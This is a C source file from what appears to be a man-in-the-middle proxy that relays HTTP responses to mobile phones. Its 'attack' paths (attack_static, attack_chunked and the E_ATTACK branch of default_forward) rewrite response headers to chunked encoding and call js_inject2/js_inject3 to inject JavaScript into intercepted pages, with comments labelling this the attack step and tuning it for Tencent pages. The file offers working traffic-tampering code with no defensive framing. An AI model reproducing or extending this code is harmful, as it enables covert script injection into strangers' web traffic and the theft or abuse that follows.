#include "includes.h"

int attack_static(webserverinfo_t *webserver)
{
	int ret = -1;
	int offset = 0;
	if (webserver->respons->datalen > 0)
	{
		while (1)
		{
			char *respons = webserver->respons->buf + offset;
			webserver->swap_buf->datalen = strline(respons, webserver->swap_buf->buf, webserver->swap_buf->bufsize);
			if (webserver->swap_buf->datalen <= 0)
				break;

			offset += webserver->swap_buf->datalen;

			if (isStrnexit_case(webserver->swap_buf->buf, webserver->swap_buf->datalen, "Content-Length:", 15)
			/*|| isStrnexit_case(webserver->swap_buf->buf, webserver->swap_buf->datalen, "Content-Length:", 15)
			|| isStrnexit(webserver->swap_buf->buf, webserver->swap_buf->datalen, "Content-length:", 15)
			|| isStrnexit(webserver->swap_buf->buf, webserver->swap_buf->datalen, "content-length:", 15)*/)
			{
				webserver->swap_buf->datalen = 28;
				memcpy(webserver->swap_buf->buf, "Transfer-Encoding: chunked\r\n", webserver->swap_buf->datalen);
			}
			webserver->swap_buf->buf[webserver->swap_buf->datalen] = 0;
			
			ret = socket_send(webserver->phonefd, webserver->swap_buf->buf, webserver->swap_buf->datalen, 15);
			if (ret != webserver->swap_buf->datalen)
			{
				LOG_ERROR_INFO("send respons header to phone error! ret = %d\n", ret);
				return -1;
			}
			//printf("--->"COLOR_YELLOW"%s"COLOR_NONE_C, webserver->swap_buf->buf);
			if (strcmp(webserver->swap_buf->buf, "\r\n") == 0)
				break;
		}
		webserver->swap_buf->datalen = 0;
		webserver->respons->datalen = 0;
	}

	int url_len = webserver->phone->request->host->datalen 
				+ webserver->phone->request->port->datalen 
				+ webserver->phone->request->uri->datalen + 1;
	char url[url_len + 10];
	sprintf(url, "http://%s:%s%s", webserver->phone->request->host->buf, 
		webserver->phone->request->port->buf, webserver->phone->request->uri->buf);
	url_len += 7;

	int read_len = 0;
	socketstate_t state = E_ERROR;
	while (webserver->tmp > 0)
	{
		if (webserver->tmp > webserver->swap_buf->bufsize - 1)
		{
			read_len = webserver->swap_buf->bufsize - 1;
		}
		else
		{
			read_len = webserver->tmp;
		}
		webserver->swap_buf->datalen = socket_read(webserver->serverfd, 
			webserver->swap_buf->buf, read_len, &state);
		if (webserver->swap_buf->datalen <= 0)
		{
			if (state == E_EAGIN)
			{
				return 0;
			}
			if (state == E_ERROR)
			{
				LOG_ERROR_INFO("read context error! ret = %d\n", webserver->swap_buf->datalen);
				return -1;
			}
		}
		webserver->swap_buf->buf[webserver->swap_buf->datalen] = 0;
		webserver->tmp -= webserver->swap_buf->datalen;
		//printf("--->"COLOR_YELLOW"%s"COLOR_NONE_C, webserver->swap_buf->buf);

		//进行攻击动作
		char *context = webserver->swap_buf->buf;
		int contextlen = webserver->swap_buf->datalen;
#if 1		
		//因为腾讯网页会在开头存在body注释,所以我们每次包都查找一遍
		//但是会影响网速效率，先这样干着，后面再想办法
		webserver->jsin_flag = 1;
		webserver->policy_flag = 1;
		ret = js_inject2(webserver->phonefd, &context, &contextlen, url, url_len, 
					NULL, 0, NULL, 0, webserver->jsin_flag, &webserver->policy_flag);
		if (ret >= 0)
		{
			webserver->jsin_flag = 0;
			webserver->policy_flag = 0;
		}
		if (contextlen <= 0)
		{
			continue;
		}
#endif
		char chunkedsize[20];
		sprintf(chunkedsize, "%x\r\n", contextlen);
		int len = strlen(chunkedsize);
		ret = socket_send(webserver->phonefd, chunkedsize, len, 15);
		if (ret != len)
		{
			LOG_ERROR_INFO("send context to phone error! datalen = %d, ret = %d\n", len, ret);
			return -1;
		}		
		
		ret = socket_send(webserver->phonefd, context, contextlen, 15);
		if (ret != contextlen)
		{
			LOG_ERROR_INFO("send context to phone error! datalen = %d, ret = %d\n", 
						webserver->swap_buf->datalen, ret);
			return -1;
		}
		
		ret = socket_send(webserver->phonefd, "\r\n", 2, 15);
		if (ret != 2)
		{
			LOG_ERROR_INFO("send context to phone error! datalen = %d, ret = %d\n", len, ret);
			return -1;
		}
	}
	ret = socket_send(webserver->phonefd, "0\r\n\r\n", 5, 15);
	if (ret != 5)
	{
		LOG_ERROR_INFO("send context to phone error! datalen = %d, ret = %d\n", 5, ret);
		return -1;
	}
	webserver->opt = E_WEBSERVER_FINISHED;
	return 0;
}

int accept_static(webserverinfo_t *webserver)
{
	int ret = -1;
	
	if (webserver->respons->datalen > 0)
	{
		ret = socket_send(webserver->phonefd, webserver->respons->buf, webserver->respons->datalen, 15);
		if (ret != webserver->respons->datalen)
		{
			LOG_ERROR_INFO("send respons header to phone error! ret = %d\n", ret);
			return -1;
		}
		webserver->respons->datalen = 0;
	}

	int read_len = 0;
	socketstate_t state = E_ERROR;
	while (webserver->tmp > 0)
	{
		if (webserver->tmp > webserver->swap_buf->bufsize - 1)
		{
			read_len = webserver->swap_buf->bufsize - 1;
		}
		else
		{
			read_len = webserver->tmp;
		}
		webserver->swap_buf->datalen = socket_read(webserver->serverfd, 
			webserver->swap_buf->buf, read_len, &state);
		if (webserver->swap_buf->datalen <= 0)
		{
			if (state == E_EAGIN)
			{
				return 0;
			}
			if (state == E_ERROR)
			{
				LOG_ERROR_INFO("read context error! ret = %d\n", webserver->swap_buf->datalen);
				return -1;
			}
		}
		webserver->swap_buf->buf[webserver->swap_buf->datalen] = 0;
		webserver->tmp -= webserver->swap_buf->datalen;
		ret = socket_send(webserver->phonefd, webserver->swap_buf->buf, webserver->swap_buf->datalen, 15);
		if (ret != webserver->swap_buf->datalen)
		{
			LOG_ERROR_INFO("send context to phone error! datalen = %d, ret = %d\n", 
						webserver->swap_buf->datalen, ret);
			return -1;
		}
	}
	webserver->opt = E_WEBSERVER_FINISHED;
	return 0;
}

int process_static(webserverinfo_t *webserver)
{
	int ret = -1;

	switch (webserver->mitm)
	{
		case E_ATTACK:
		{
			ret = attack_static(webserver);
			break;
		}
		case E_ACCEPT:
		default:
		{
			ret = accept_static(webserver);
			break;
		}
	}
	
	return ret;
}

int attack_chunked(webserverinfo_t *webserver)
{
	int ret = -1;
	
	if (webserver->respons->datalen > 0)
	{
		ret = socket_send(webserver->phonefd, webserver->respons->buf, webserver->respons->datalen, 15);
		if (ret != webserver->respons->datalen)
		{
			LOG_ERROR_INFO("send respons header to phone error! ret = %d\n", ret);
			return -1;
		}
		webserver->respons->datalen = 0;
	}

	int url_len = webserver->phone->request->host->datalen 
				+ webserver->phone->request->port->datalen 
				+ webserver->phone->request->uri->datalen + 1;
	char url[url_len + 10];
	sprintf(url, "http://%s:%s%s", webserver->phone->request->host->buf, 
		webserver->phone->request->port->buf, webserver->phone->request->uri->buf);
	url_len += 7;
	
	socketstate_t state = E_ERROR;
	while (1)
	{
		while (webserver->flag)
		{
			char *buf = webserver->swap_buf->buf + webserver->swap_buf->datalen;
			ret = socket_read(webserver->serverfd, buf, 1, &state);
			if (ret <= 0)
			{
				if (state == E_EAGIN)
				{
					return 0;
				}
				if (state == E_ERROR)
				{
					LOG_ERROR_INFO("read context error! ret = %d\n", webserver->swap_buf->datalen);
					return -1;
				}
			}
			webserver->swap_buf->datalen += ret;
			webserver->swap_buf->buf[webserver->swap_buf->datalen] = 0;
			if (webserver->swap_buf->datalen == 2)
			{
				if (strcmp(webserver->swap_buf->buf, "\r\n") == 0)
				{
					webserver->flag = 0;
					webserver->swap_buf->datalen = 0;
					break;
				}
				else
				{
					LOG_ERROR_INFO("read chunked end flag error!\n");
					return -1;
				}
			}
			else if (webserver->swap_buf->datalen > 2)
			{
				LOG_ERROR_INFO("read chunked endflag error! [ %s ]\n", webserver->swap_buf->buf);
				return -1;
			}
		}
		
		//获取长度
		if (webserver->tmp <= 0)
		{
			for ( ; ; )
			{
				char *buf = webserver->swap_buf->buf + webserver->swap_buf->datalen;
				ret = socket_read(webserver->serverfd, buf, 1, &state);
				if (ret <= 0)
				{
					if (state == E_EAGIN)
					{
						return 0;
					}
					if (state == E_ERROR)
					{
						LOG_ERROR_INFO("read context error! ret = %d\n", webserver->swap_buf->datalen);
						return -1;
					}					
				}
				buf[ret] = 0;
				webserver->swap_buf->datalen += ret;
				if (buf[0] == '\n')
				{
					char tmp[15] = {0};
					int i = 0;
					for (i = 0; i < 15; i ++)
					{
						if (webserver->swap_buf->buf[i] == '\r'
						|| webserver->swap_buf->buf[i] == '\n'
						|| webserver->swap_buf->buf[i] == '\0')
						{
							break;
						}
						tmp[i] = webserver->swap_buf->buf[i];
					}
					webserver->tmp = strtol(tmp, NULL, 16);
					LOG_WARN_INFO("webserver->tmp = %d\n", webserver->tmp);

					if (webserver->tmp > 0)
					{
					}
					else
					{
						ret = socket_send(webserver->phonefd, "0\r\n\r\n", 5, 15);
						if (ret != 5)
						{
							LOG_ERROR_INFO("send context to phone error! ret = %d\n", ret);
							return -1;
						}
						webserver->flag = 0;
						webserver->opt = E_WEBSERVER_FINISHED;
						return 0;
					}
					
					break;
				}
			}
		}
		
		int read_len = 0;
		while (webserver->tmp > 0)
		{
			if (webserver->tmp > webserver->swap_buf->bufsize - 1)
			{
				read_len = webserver->swap_buf->bufsize - 1;
			}
			else
			{
				read_len = webserver->tmp;
			}
			webserver->swap_buf->datalen = socket_read(webserver->serverfd, 
					webserver->swap_buf->buf, read_len, &state);
			if (webserver->swap_buf->datalen <= 0)
			{
				if (state == E_EAGIN)
				{
					return 0;
				}
				if (state == E_ERROR)
				{
					LOG_ERROR_INFO("read context error! ret = %d\n", webserver->swap_buf->datalen);
					return -1;
				}
			}
			webserver->tmp -= webserver->swap_buf->datalen;

			//攻击

			char *context = webserver->swap_buf->buf;
			int contextlen = webserver->swap_buf->datalen;
#if 1

			//因为腾讯网页会在开头存在body注释,所以我们每次包都查找一遍
			//但是会影响网速效率，先这样干着，后面再想办法
			webserver->jsin_flag = 1;
			webserver->policy_flag = 1;
			ret = js_inject2(webserver->phonefd, &context, &contextlen, url, url_len, 
						NULL, 0, NULL, 0, webserver->jsin_flag, &webserver->policy_flag);
			if (ret >= 0)
			{
				webserver->jsin_flag = 0;
				webserver->policy_flag = 0;
			}
			if (contextlen <= 0)
			{
				continue;
			}
#endif
			char chunkedsize[20];
			sprintf(chunkedsize, "%x\r\n", contextlen);
			int len = strlen(chunkedsize);
			ret = socket_send(webserver->phonefd, chunkedsize, len, 15);
			if (ret != len)
			{
				LOG_ERROR_INFO("send context to phone error! ret = %d\n", ret);
				return -1;
			}
			
			ret = socket_send(webserver->phonefd, context, contextlen, 15);
			if (ret != contextlen)
			{
				LOG_ERROR_INFO("send context to phone error! ret = %d\n", ret);
				return -1;
			}

			ret = socket_send(webserver->phonefd, "\r\n", 2, 15);
			if (ret != 2)
			{
				LOG_ERROR_INFO("send context to phone error! ret = %d\n", ret);
				return -1;
			}
		}
		//读取完毕此chunked块，重新置位0,待下一次读取
		webserver->tmp = 0;
		webserver->swap_buf->datalen = 0;

		//读结尾符
		webserver->flag = 1;
	}

	return 0;

}

int accept_chunked(webserverinfo_t *webserver)
{
	int ret = -1;
	
	if (webserver->respons->datalen > 0)
	{
		ret = socket_send(webserver->phonefd, webserver->respons->buf, webserver->respons->datalen, 15);
		if (ret != webserver->respons->datalen)
		{
			LOG_ERROR_INFO("send respons header to phone error! ret = %d\n", ret);
			return -1;
		}
		//printf("----------->>>>>> %s", webserver->respons->buf);
		webserver->respons->datalen = 0;
	}
	socketstate_t state = E_ERROR;
	while (1)
	{
		//获取长度
		if (webserver->tmp <= 0)
		{
			for ( ; ; )
			{
				char *buf = webserver->swap_buf->buf + webserver->swap_buf->datalen;
				ret = socket_read(webserver->serverfd, buf, 1, &state);
				if (ret <= 0)
				{
					if (state == E_EAGIN)
					{
						return 0;
					}
					if (state == E_ERROR)
					{
						LOG_ERROR_INFO("read context error! ret = %d\n", webserver->swap_buf->datalen);
						return -1;
					}					
				}
				buf[ret] = 0;
				webserver->swap_buf->datalen += ret;
				if (buf[0] == '\n')
				{
					char tmp[15] = {0};
					int i = 0;
					for (i = 0; i < 15; i ++)
					{
						if (webserver->swap_buf->buf[i] == '\r'
						|| webserver->swap_buf->buf[i] == '\n'
						|| webserver->swap_buf->buf[i] == '\0')
						{
							break;
						}
						tmp[i] = webserver->swap_buf->buf[i];
					}
					webserver->tmp = strtol(tmp, NULL, 16);
					LOG_WARN_INFO("webserver->tmp = %d\n", webserver->tmp);

					if (webserver->tmp > 0)
					{
						ret = socket_send(webserver->phonefd, webserver->swap_buf->buf, webserver->swap_buf->datalen, 15);
						if (ret != webserver->swap_buf->datalen)
						{
							LOG_ERROR_INFO("send context to phone error! ret = %d\n", ret);
							return -1;
						}				
						webserver->tmp += 2;
					}
					else
					{
						ret = socket_send(webserver->phonefd, "0\r\n\r\n", 5, 15);
						if (ret != 5)
						{
							LOG_ERROR_INFO("send context to phone error! ret = %d\n", ret);
							return -1;
						}
						webserver->opt = E_WEBSERVER_FINISHED;
						return 0;
					}
					
					break;
				}
			}
		}
		
		int read_len = 0;
		while (webserver->tmp > 0)
		{
			if (webserver->tmp > webserver->swap_buf->bufsize - 1)
			{
				read_len = webserver->swap_buf->bufsize - 1;
			}
			else
			{
				read_len = webserver->tmp;
			}
			webserver->swap_buf->datalen = socket_read(webserver->serverfd, 
					webserver->swap_buf->buf, read_len, &state);
			if (webserver->swap_buf->datalen <= 0)
			{
				if (state == E_EAGIN)
				{
					return 0;
				}
				if (state == E_ERROR)
				{
					LOG_ERROR_INFO("read context error! ret = %d\n", webserver->swap_buf->datalen);
					return -1;
				}
			}
			webserver->tmp -= webserver->swap_buf->datalen;
			ret = socket_send(webserver->phonefd, webserver->swap_buf->buf, webserver->swap_buf->datalen, 15);
			if (ret != webserver->swap_buf->datalen)
			{
				LOG_ERROR_INFO("send context to phone error! ret = %d\n", ret);
				return -1;
			}
		}
		//读取完毕此chunked块，重新置位0,待下一次读取
		webserver->tmp = 0;
		webserver->swap_buf->datalen = 0;
	}

	return 0;
}

int process_chunked(webserverinfo_t *webserver)
{
	int ret = -1;
	switch (webserver->mitm)
	{
		case E_ATTACK:
		{
			ret = attack_chunked(webserver);
			break;
		}
		case E_ACCEPT:
		default:
		{
			ret = accept_chunked(webserver);
			break;
		}
	}

	return ret;
}

int default_forward(webserverinfo_t *webserver)
{
	int ret = -1;
	
	if (webserver->respons->datalen > 0)
	{
		ret = socket_send(webserver->phonefd, webserver->respons->buf, webserver->respons->datalen, 15);
		if (ret != webserver->respons->datalen)
		{
			LOG_ERROR_INFO("send respons header to phone error! ret = %d\n", ret);
			return -1;
		}
		webserver->respons->datalen = 0;
	}
	
	char url[4048];
	sprintf(url, "%s:%s%s", webserver->phone->request->host->buf, 
		webserver->phone->request->port->buf, webserver->phone->request->uri->buf);
	int url_len = webserver->phone->request->host->datalen 
				+ webserver->phone->request->port->datalen 
				+ webserver->phone->request->uri->datalen + 1;

	socketstate_t state = E_ERROR;
	webserver->swap_buf->datalen = 0;
	while (1)
	{
		webserver->swap_buf->datalen = socket_read(webserver->serverfd, 
				webserver->swap_buf->buf, webserver->swap_buf->bufsize-1, &state);
		if (webserver->swap_buf->datalen <= 0)
		{
			if (state == E_EAGIN)
			{
				return 0;
			}
			if (state == E_ERROR)
			{
				LOG_ERROR_INFO("read context error! ret = %d\n", webserver->swap_buf->datalen);
				return -1;
			}
		}

		char *context = webserver->swap_buf->buf;
		int contextlen = webserver->swap_buf->datalen;
		if (webserver->mitm == E_ATTACK)
		{
			webserver->jsin_flag = 1;
			webserver->policy_flag = 1;
			ret = js_inject3(webserver->phonefd, &context, &contextlen, url, url_len, 
						NULL, 0, NULL, 0, webserver->jsin_flag, &webserver->policy_flag);
			if (ret >= 0)
			{
				webserver->jsin_flag = 0;
				webserver->policy_flag = 0;
			}
			if (contextlen <= 0)
			{
				continue;
			}
		}
		
		ret = socket_send(webserver->phonefd, context, contextlen, 15);
		if (ret != contextlen)
		{
			LOG_ERROR_INFO("send context to phone error! ret = %d\n", ret);
			return -1;
		}
	}

	webserver->opt = E_WEBSERVER_FINISHED;

	return 0;
}

